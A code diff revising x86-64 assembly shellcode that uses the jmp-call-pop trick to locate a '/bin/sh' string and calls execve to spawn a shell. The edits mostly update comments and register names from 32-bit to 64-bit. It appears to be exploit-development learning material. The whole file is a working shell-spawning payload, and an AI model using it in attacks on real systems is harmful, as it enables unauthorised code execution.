@@ -3,7 +3,7 @@ global _start
 section .text
 _start:
 
-    jmp short two     ; Jump down to the bottom for the call trick.
+    jmp two     ; Jump down to the bottom for the call trick.
 one:
     ; 64 bit System V ABI 
     ; system calls use: RDI/RSI/RDX/R10/R8/R9
@@ -11,16 +11,16 @@ one:
     ; int execve(const char *filename, char *const argv [], char *const envp[])
     ;                     RDI                 RSI                RDX
 
-    pop rdi           ; Ebx has the addr of the string.
+    pop rdi           ; pop addr of the string into rdi
     xor rax, rax      ; Put 0 into rax.
-    mov [rdi+7], al   ; Null terminate the /bin/sh string.
-    mov [rdi+8], rdi  ; Put addr from rbx where the AAAA is.
-    mov [rdi+16], rax ; Put 32-bit null terminator where the BBBB is.
-    lea rsi, [rdi+8]  ; Load the address of [rbx+8] into ecx for argv ptr.
-    lea rdx, [rdi+16] ; Edx = rbx + 12, which is the envp ptr.
-    add rax, 59        ; Syscall #11
+    mov [rdi+7], byte ah   ; Null terminate the /bin/sh string.
+    mov [rdi+8], rdi  ; Put addr from rdi where the AAAAAAAA is.
+    mov [rdi+16], rax ; Put 64-bit null terminator where the BBBBBBBB is.
+    lea rsi, [rdi+8]  ; Load the address of [rdi+8] into rsi for argv ptr.
+    lea rdx, [rdi+16] ; rdx = rdi + 16, which is the envp ptr.
+    add rax, 59       ; Syscall #59
     syscall
 
 two:
     call one          ; Use a call to get string address.
-    db '/bin/shXAAAAAAAABBBBBBBB'     ; The XAAAABBBB bytes aren't needed.
+    db '/bin/shXAAAAAAAABBBBBBBB'     
